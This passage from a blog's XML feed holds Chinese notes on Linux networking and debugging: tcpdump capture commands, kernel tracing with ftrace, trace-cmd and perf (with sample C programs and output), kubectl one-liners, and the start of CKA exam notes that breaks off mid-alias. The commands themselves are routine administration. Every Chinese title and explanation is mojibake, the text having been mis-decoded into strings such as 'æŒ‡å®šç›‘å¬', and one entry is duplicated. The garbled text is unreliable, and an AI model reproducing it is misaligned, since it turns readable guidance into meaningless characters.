    <link href="/2022/12/21/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91tcpdump%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <url>/2022/12/21/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91tcpdump%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h2 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h2><p>-i ã€€ã€€   æŒ‡å®šç›‘å¬çš„ç½‘ç»œæ¥å£ï¼›<br>-n ã€€ã€€  æŒ‡å®šå°†æ¯ä¸ªç›‘å¬åˆ°æ•°æ®åŒ…ä¸­çš„åŸŸåè½¬æ¢æˆIPåœ°å€åæ˜¾ç¤ºï¼Œä¸æŠŠç½‘ç»œåœ°å€è½¬æ¢æˆåå­—ï¼›</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">tcpdump -ne -i bond0 11.254.xxx<br>tcpdump -ne -i calixxx -c 10<br>tcpdump -nn -i cali8b980351434 -w 5-master-cali.cap<br>tcpdump -nn -i eth0 icmp<br><br>tcpdump -n -i veth0<br><br>ping -c 100 -I veth0 1.2.3.102<br>tcpdump -n -i veth0<br>tcpdump -n -i veth1<br>tcpdump -n -i br0<br><br>tcpdump -i eth0 -n <br>tcpdump -i eth0 -n -w eth0.cap<br>tcpdump udp port 53 <br><br><br>tcpdump host x.x.x.x -i any -n <br>tcpdump -eni bond0.0 -vvv port 443 and port 6443<br><br><br>[root@n18 ~]<span class="hljs-comment"># tcpdump port 53 udp</span><br>tcpdump: syntax error <span class="hljs-keyword">in</span> filter expression: syntax error<br><br><br>æŠ“åŒ…å†…å®¹è¾“å‡ºåˆ°æ–‡ä»¶ï¼š<br><span class="hljs-comment"># æŠ“å–æŒ‡å®šç½‘å¡çš„åŒ…è¾“å‡ºåˆ°test.cap</span><br>tcpdump -i en0 -w test.cap<br>ä¹‹åæˆ‘ä»¬å¯ä»¥æŠŠtest.capç›´æ¥ç”¨wiresharkæ‰“å¼€ï¼Œå°±å¯ä»¥å¾ˆç›´è§‚çš„åˆ†æåŒ…äº†ã€‚<br><br><span class="hljs-comment"># ç”¨tcpdumpè¾“å‡ºcapæ–‡ä»¶åŒ…ï¼š</span><br>tcpdump -r test.cap<br><br><br><br></code></pre></td></tr></table></figure><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://www.kancloud.cn/pshizhsysu/linux/1799754">https://www.kancloud.cn/pshizhsysu/linux/1799754</a></p>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
    <tags>
      
      <tag>net</tag>
      
      <tag>tcpdump</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linuxå†…æ ¸è°ƒè¯•è¿½è¸ªæŠ€æœ¯</title>
    <link href="/2022/12/20/linux%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95/linux%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95%E8%BF%BD%E8%B8%AA%E6%8A%80%E6%9C%AF/"/>
    <url>/2022/12/20/linux%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95/linux%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95%E8%BF%BD%E8%B8%AA%E6%8A%80%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<h2 id="æ–‡ä»¶æº"><a href="#æ–‡ä»¶æº" class="headerlink" title="æ–‡ä»¶æº"></a>æ–‡ä»¶æº</h2><p><a href="https://www.bilibili.com/video/BV1GT411J7us/?spm_id_from=333.880.my_history.page.click&vd_source=3d4bc6a91e11c12d0e3b57b4e50c9818">bç«™åœ°å€</a><br><a href="https://www.processon.com/view/link/62a09494637689075856157e">æ€ç»´å¯¼å›¾åœ°å€</a>     å¯†ç ï¼šlinux</p><h2 id="å¦‚ä½•è°ƒè¯•linuxå†…æ ¸ï¼Ÿ"><a href="#å¦‚ä½•è°ƒè¯•linuxå†…æ ¸ï¼Ÿ" class="headerlink" title="å¦‚ä½•è°ƒè¯•linuxå†…æ ¸ï¼Ÿ"></a>å¦‚ä½•è°ƒè¯•linuxå†…æ ¸ï¼Ÿ</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221220153919.png" alt="image.png"></p><p>å†…æ ¸è°ƒè¯•<br>æ—¥å¿—ï¼šæ—¥å¿—é‡‡é›†â€“æ—¥å¿—åˆ†ç±»å’Œå¤„ç†-ç”¨æˆ·æŸ¥çœ‹æ—¥å¿—</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221220154421.png" alt="image.png"></p><p>debugfsæ˜¯ä¸€ç§è™šæ‹Ÿçš„æ–‡ä»¶ç³»ç»Ÿ</p><h2 id="linuxå†…æ ¸è¿½è¸ªç³»ç»Ÿä¹‹äº‹ä»¶æº"><a href="#linuxå†…æ ¸è¿½è¸ªç³»ç»Ÿä¹‹äº‹ä»¶æº" class="headerlink" title="linuxå†…æ ¸è¿½è¸ªç³»ç»Ÿä¹‹äº‹ä»¶æº"></a>linuxå†…æ ¸è¿½è¸ªç³»ç»Ÿä¹‹äº‹ä»¶æº</h2><h2 id="linuxè¿½è¸ªæ¡†æ¶ä¹‹ftrace"><a href="#linuxè¿½è¸ªæ¡†æ¶ä¹‹ftrace" class="headerlink" title="linuxè¿½è¸ªæ¡†æ¶ä¹‹ftrace"></a>linuxè¿½è¸ªæ¡†æ¶ä¹‹ftrace</h2><p>å¯ä»¥å®ç°å¯¹çƒ­ç‚¹å‡½æ•°è¯¦ç»†çš„è¿½è¸ªåˆ†æ<br>æ‰§è¡Œå’Œè·Ÿè¸ªå†…æ ¸é‡ŒæŸä¸€ä¸ªå‡½æ•°çš„è°ƒç”¨è¿‡ç¨‹</p><h3 id="å‰ç«¯å·¥å…·ï¼šdebugfs"><a href="#å‰ç«¯å·¥å…·ï¼šdebugfs" class="headerlink" title="å‰ç«¯å·¥å…·ï¼šdebugfs"></a>å‰ç«¯å·¥å…·ï¼šdebugfs</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># å®è·µ</span><br>1ã€è¿›å…¥debugfsç›®å½•  <br>$ <span class="hljs-built_in">cd</span> /sys/kernel/debug/tracing  <br>å¦‚æœæ‰¾ä¸åˆ°ç›®å½•ï¼Œæ‰§è¡Œä¸‹åˆ—å‘½ä»¤æŒ‚è½½debugfsï¼š  <br>$ mount -t debugfs nodev /sys/kernel/debug<br><br>2ã€æŸ¥è¯¢æ”¯æŒçš„è¿½è¸ªå™¨  <br>$ <span class="hljs-built_in">cat</span> available_tracers  <br>å¸¸ç”¨çš„æœ‰ä¸¤ç§ï¼š<br><br>-   <span class="hljs-keyword">function</span> è¡¨ç¤ºè·Ÿè¸ªå‡½æ•°çš„æ‰§è¡Œï¼›<br>-   function_graph åˆ™æ˜¯è·Ÿè¸ªå‡½æ•°çš„è°ƒç”¨å…³ç³»ï¼›<br><br>3ã€æŸ¥çœ‹æ”¯æŒè¿½è¸ªçš„å†…æ ¸å‡½æ•°å’Œäº‹ä»¶ã€‚å…¶ä¸­å‡½æ•°å°±æ˜¯å†…æ ¸ä¸­çš„å‡½æ•°åï¼Œè€Œäº‹ä»¶ï¼Œåˆ™æ˜¯å†…æ ¸æºç ä¸­é¢„å…ˆå®šä¹‰çš„è·Ÿè¸ªç‚¹ã€‚  <br>//æŸ¥çœ‹å†…æ ¸å‡½æ•°  <br>$ <span class="hljs-built_in">cat</span> available_filter_functions  <br>//æŸ¥çœ‹äº‹ä»¶  <br>$ <span class="hljs-built_in">cat</span> available_events<br><br>4ã€è®¾ç½®è¿½è¸ªå‡½æ•°ï¼š  <br>$ <span class="hljs-built_in">echo</span> do_sys_open &gt; set_graph_function<br><br>5ã€è®¾ç½®è¿½è¸ªå™¨  <br>$ <span class="hljs-built_in">echo</span> function_graph &gt; current_tracer  <br>$ <span class="hljs-built_in">echo</span> funcgraph-proc &gt; trace_options<br><br>6ã€å¼€å¯è¿½è¸ª  <br>$ <span class="hljs-built_in">echo</span> 1 &gt; tracing_on<br><br>7ã€æ‰§è¡Œä¸€ä¸ª <span class="hljs-built_in">ls</span> å‘½ä»¤åï¼Œå†å…³é—­è·Ÿè¸ª  <br>$ <span class="hljs-built_in">ls</span>  <br>$ <span class="hljs-built_in">echo</span> 0 &gt; tracing_on<br><br>8ã€æœ€åä¸€æ­¥ï¼ŒæŸ¥çœ‹è·Ÿè¸ªç»“æœ  <br>$ <span class="hljs-built_in">cat</span> trace<br></code></pre></td></tr></table></figure><h3 id="å‰ç«¯å·¥å…·ï¼štrace-cmd"><a href="#å‰ç«¯å·¥å…·ï¼štrace-cmd" class="headerlink" title="å‰ç«¯å·¥å…·ï¼štrace-cmd"></a>å‰ç«¯å·¥å…·ï¼štrace-cmd</h3><p>trace-cmdæ˜¯ftraceçš„ä¸€ä¸ªå°è£…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># å®‰è£…ä¸ä½¿ç”¨</span><br>apt install trace-cmd<br>man trace-cmd<br><br><span class="hljs-comment"># è¿™ä¸¤ä¸ªåˆ—å‡ºæ¥çš„æ˜¯ä¸€æ ·çš„</span><br>[root@k8s-node2 tracing]<span class="hljs-comment"># trace-cmd list -e |wc -l</span><br>1502<br><br>[root@k8s-node2 tracing]<span class="hljs-comment"># pwd</span><br>/sys/kernel/debug/tracing<br>[root@k8s-node2 tracing]<span class="hljs-comment"># cat available_events |wc -l</span><br>1502<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># å®è·µ</span><br>1ã€è®°å½•  <br>$ trace-cmd record -p function_graph -g do_sys_open -O funcgraph-proc <span class="hljs-built_in">ls</span><br><br>2ã€æ˜¾ç¤º  <br>$ trace-cmd report<br></code></pre></td></tr></table></figure><h2 id="linuxè¿½è¸ªæ¡†æ¶ä¹‹perf"><a href="#linuxè¿½è¸ªæ¡†æ¶ä¹‹perf" class="headerlink" title="linuxè¿½è¸ªæ¡†æ¶ä¹‹perf"></a>linuxè¿½è¸ªæ¡†æ¶ä¹‹perf</h2><p>æ”¯æŒé‡‡æ ·<br>é€šè¿‡é‡‡æ ·æ‰¾åˆ°çƒ­ç‚¹å‡½æ•°ï¼Œé‡‡æ ·é¢‘ç‡å¯ä»¥é€šè¿‡å‚æ•°æŒ‡å®š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@k8s-node2 ~]<span class="hljs-comment"># apt install linux-tools-common</span><br><br>[root@k8s-node2 ~]<span class="hljs-comment"># cat /sys/kernel/debug/tracing/available_events | grep receive_skb</span><br>net:netif_receive_skb_list_exit<br>net:netif_receive_skb_exit<br>net:netif_receive_skb_list_entry<br>net:netif_receive_skb_entry<br>net:netif_receive_skb<br>[root@k8s-node2 ~]<span class="hljs-comment">#</span><br>[root@k8s-node2 ~]<span class="hljs-comment"># perf list| grep receive_skb</span><br>  net:netif_receive_skb                              [Tracepoint event]<br>  net:netif_receive_skb_entry                        [Tracepoint event]<br>  net:netif_receive_skb_exit                         [Tracepoint event]<br>  net:netif_receive_skb_list_entry                   [Tracepoint event]<br>  net:netif_receive_skb_list_exit                    [Tracepoint event]<br>[root@k8s-node2 ~]<span class="hljs-comment">#</span><br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># perf record</span><br><span class="hljs-comment"># perf script</span><br><span class="hljs-comment"># perf report</span><br><br><span class="hljs-comment"># perf record -g ls</span><br><span class="hljs-comment"># perf script</span><br><span class="hljs-comment"># perf report</span><br><br><span class="hljs-comment"># perf list |grep do_sys_open</span><br><span class="hljs-comment"># perf probe --add do_sys_open</span><br><span class="hljs-comment"># perf record -e probe:do_sys_open -aR sleep 1</span><br><span class="hljs-comment"># perf script</span><br><span class="hljs-comment"># perf report</span><br><br><span class="hljs-comment"># perf trace</span><br><br><br><br>[root@n16 dynamic-tracing]<span class="hljs-comment"># cat main.c</span><br><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><span class="hljs-comment">#include &lt;sys/types.h&gt;</span><br><span class="hljs-comment">#include &lt;unistd.h&gt;</span><br><br>void <span class="hljs-function"><span class="hljs-title">main</span></span>()<br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello, pid=%d\n&quot;</span>, getpid());<br>    <span class="hljs-keyword">while</span>(1) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;begin sleep...\n&quot;</span>);<br>        <span class="hljs-built_in">sleep</span>(1);<br>    &#125;<br>&#125;<br>[root@n16 dynamic-tracing]<span class="hljs-comment"># gcc -o main main.c</span><br>[root@n16 dynamic-tracing]<span class="hljs-comment"># perf stat ./main</span><br>hello, pid=3422281<br>begin <span class="hljs-built_in">sleep</span>...<br>begin <span class="hljs-built_in">sleep</span>...<br>begin <span class="hljs-built_in">sleep</span>...<br>begin <span class="hljs-built_in">sleep</span>...<br>begin <span class="hljs-built_in">sleep</span>...<br>begin <span class="hljs-built_in">sleep</span>...<br>^C./main: Interrupt<br><br> Performance counter stats <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;./main&#x27;</span>:<br><br>              0.62 msec task-clock                <span class="hljs-comment">#    0.000 CPUs utilized</span><br>                 6      context-switches          <span class="hljs-comment">#    0.010 M/sec</span><br>                 0      cpu-migrations            <span class="hljs-comment">#    0.000 K/sec</span><br>                50      page-faults               <span class="hljs-comment">#    0.080 M/sec</span><br>         1,508,737      cycles                    <span class="hljs-comment">#    2.425 GHz</span><br>           869,282      instructions              <span class="hljs-comment">#    0.58  insn per cycle</span><br>           176,507      branches                  <span class="hljs-comment">#  283.740 M/sec</span><br>             8,840      branch-misses             <span class="hljs-comment">#    5.01% of all branches</span><br><br>       5.795174879 seconds time elapsed<br><br>       0.000627000 seconds user<br>       0.000080000 seconds sys<br>   <br><span class="hljs-comment"># perf top</span><br><br><br><br>[root@n16 perf]<span class="hljs-comment"># cat perftest.cpp</span><br><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><span class="hljs-comment">#include &lt;cmath&gt;</span><br><span class="hljs-comment">#include &lt;sys/types.h&gt;</span><br><span class="hljs-comment">#include &lt;unistd.h&gt;</span><br>using namespace std;<br><br>void <span class="hljs-function"><span class="hljs-title">for_loop</span></span>()<br>&#123;<br>    <span class="hljs-keyword">for</span> (int i = 0; i &lt; 1000; i++) &#123;<br>        <span class="hljs-keyword">for</span> (int j = 0; j &lt; 10000; j++) &#123;<br>            int x = sin(i) + cos(j);<br>        &#125;<br>    &#125;<br>&#125;<br><br>void <span class="hljs-function"><span class="hljs-title">loopsmall</span></span>()<br>&#123;<br>    <span class="hljs-keyword">for</span> (int i = 0; i &lt; 10; i++) &#123;<br>        for_loop();<br>    &#125;<br>&#125;<br><br>void <span class="hljs-function"><span class="hljs-title">loopbig</span></span>()<br>&#123;<br>    <span class="hljs-keyword">for</span> (int i = 0; i &lt; 100; i++) &#123;<br>        for_loop();<br>    &#125;<br>&#125;<br><br>int <span class="hljs-function"><span class="hljs-title">main</span></span>()<br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;pid=%d\n&quot;</span>, getpid());<br>    loopbig();<br>    loopsmall();<br><br>    <span class="hljs-built_in">return</span> 0;<br>&#125;<br>[root@n16 perf]<span class="hljs-comment"># g++ -o perftest perftest.cpp</span><br>[root@n16 perf]<span class="hljs-comment"># ./perftest</span><br>pid=3424465<br><span class="hljs-comment">### æ–°å¼€ä¸€ä¸ªshell</span><br>[root@n16 perf]<span class="hljs-comment"># perf record -p 3424465 -a -g -F 99 -- sleep 10</span><br>Warning:<br>PID/TID switch overriding SYSTEM<br>[ perf record: Woken up 1 <span class="hljs-built_in">times</span> to write data ]<br>[ perf record: Captured and wrote 0.096 MB perf.data (982 samples) ]<br>[root@n16 perf]<span class="hljs-comment">#</span><br>[root@n16 perf]<span class="hljs-comment">#</span><br>[root@n16 perf]<span class="hljs-comment"># perf report</span><br><br><br><br><span class="hljs-comment"># man perf report</span><br><br><span class="hljs-comment"># man perf kmem</span><br><span class="hljs-comment"># perf kmem record</span><br><span class="hljs-comment"># perf kmem stat</span><br><br><br><br>[root@n16 perf]<span class="hljs-comment"># ./main</span><br>hello, pid=3430094<br>begin <span class="hljs-built_in">sleep</span>...<br>begin <span class="hljs-built_in">sleep</span>...<br>begin <span class="hljs-built_in">sleep</span>...<br>begin <span class="hljs-built_in">sleep</span>...<br>begin <span class="hljs-built_in">sleep</span>...<br>begin <span class="hljs-built_in">sleep</span>...<br>begin <span class="hljs-built_in">sleep</span>...<br>begin <span class="hljs-built_in">sleep</span>...<br>begin <span class="hljs-built_in">sleep</span>...<br>begin <span class="hljs-built_in">sleep</span>...<br>begin <span class="hljs-built_in">sleep</span>...<br>begin <span class="hljs-built_in">sleep</span>...<br>begin <span class="hljs-built_in">sleep</span>...<br>begin <span class="hljs-built_in">sleep</span>...<br><span class="hljs-comment">### æ–°å¼€ä¸€ä¸ªshell</span><br>[root@n16 perf]<span class="hljs-comment"># perf sched record -p 3430094 -- sleep 10</span><br>[root@n16 perf]<span class="hljs-comment"># perf sched script</span><br>[root@n16 perf]<span class="hljs-comment"># perf sched latency</span><br>[root@n16 perf]<span class="hljs-comment"># perf report</span><br><br><br><br><span class="hljs-comment">## å…¨å±€é‡‡æ ·</span><br>[root@n16 perf]<span class="hljs-comment"># perf sched record -- sleep 10</span><br>[root@n16 perf]<span class="hljs-comment"># perf sched script</span><br>[root@n16 perf]<span class="hljs-comment"># perf sched latency</span><br>[root@n16 perf]<span class="hljs-comment"># perf report</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>linuxå†…æ ¸è°ƒè¯•</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€k8sç³»åˆ—ã€‘k8så¸¸ç”¨å‘½ä»¤</title>
    <link href="/2022/12/18/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91k8s%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <url>/2022/12/18/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91k8s%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">kubectl rollout restart <br><br>k2 <span class="hljs-built_in">get</span> pod -n welkin-<span class="hljs-built_in">system</span> |<span class="hljs-keyword">grep</span> dubhe-manager |<span class="hljs-keyword">grep</span> ContainerStatusUnknown | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> | xargs kubectl --kubeconfig /root/kubeconfig/kubeconfig-n2  <span class="hljs-keyword">delete</span> pod -n welkin-<span class="hljs-built_in">system</span><br><br><br></code></pre></td></tr></table></figure><h2 id="æŸ¥çœ‹æŸä¸ªnsä¸‹node0ä¸Šå†…å­˜å ç”¨é«˜çš„pod"><a href="#æŸ¥çœ‹æŸä¸ªnsä¸‹node0ä¸Šå†…å­˜å ç”¨é«˜çš„pod" class="headerlink" title="æŸ¥çœ‹æŸä¸ªnsä¸‹node0ä¸Šå†…å­˜å ç”¨é«˜çš„pod"></a>æŸ¥çœ‹æŸä¸ªnsä¸‹node0ä¸Šå†…å­˜å ç”¨é«˜çš„pod</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl top pod -n [xxxxxx] --sort-by=<span class="hljs-string">&#x27;memory&#x27;</span> | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> | xargs  kubectl get pod -n [xxxxxx]  -owide | grep node0<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€k8sç³»åˆ—ã€‘k8så¸¸ç”¨å‘½ä»¤</title>
    <link href="/2022/12/18/k8s/unsupported/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91k8s%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <url>/2022/12/18/k8s/unsupported/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91k8s%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">kubectl rollout restart <br><br>k2 <span class="hljs-built_in">get</span> pod -n welkin-<span class="hljs-built_in">system</span> |<span class="hljs-keyword">grep</span> dubhe-manager |<span class="hljs-keyword">grep</span> ContainerStatusUnknown | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> | xargs kubectl --kubeconfig /root/kubeconfig/kubeconfig-n2  <span class="hljs-keyword">delete</span> pod -n welkin-<span class="hljs-built_in">system</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€k8sç³»åˆ—ã€‘(202212) ckaè€ƒè¯•å¿…å¤‡å‘½ä»¤å¤§å…¨åŠæ³¨æ„äº‹é¡¹</title>
    <link href="/2022/12/18/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202212)%20cka%E8%80%83%E8%AF%95%E5%BF%85%E5%A4%87%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8%E5%8F%8A%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/"/>
    <url>/2022/12/18/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202212)%20cka%E8%80%83%E8%AF%95%E5%BF%85%E5%A4%87%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8%E5%8F%8A%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/</url>
    
    <content type="html"><![CDATA[<h2 id="å¿…å¤‡å‘½ä»¤"><a href="#å¿…å¤‡å‘½ä»¤" class="headerlink" title="å¿…å¤‡å‘½ä»¤"></a>å¿…å¤‡å‘½ä»¤</h2><h3 id="ä¸»æœºå±‚é¢"><a href="#ä¸»æœºå±‚é¢" class="headerlink" title="ä¸»æœºå±‚é¢"></a>ä¸»æœºå±‚é¢</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># bash completion</span><br>apt install bash-completion<br><span class="hljs-built_in">source</span> &lt;(kubectl completion bash)<br><br><br><span class="hljs-comment"># vim ~/.bahsrc</span><br><span class="hljs-built_in">alias</span> k=kubectl<br><span class="hljs-built_in">alias</span> kgn=<span class="hljs-string">&quot;kubectl get node -owide&quot;</span><br><span class="hljs-built_in">alias</span> kgp=<span class="hljs-string">&quot;kubectl get pod -owide&quot;</span><br><span class="hljs-built_in">alias</span> kgs=<span class="hljs-string">&quot;kubectl get svc 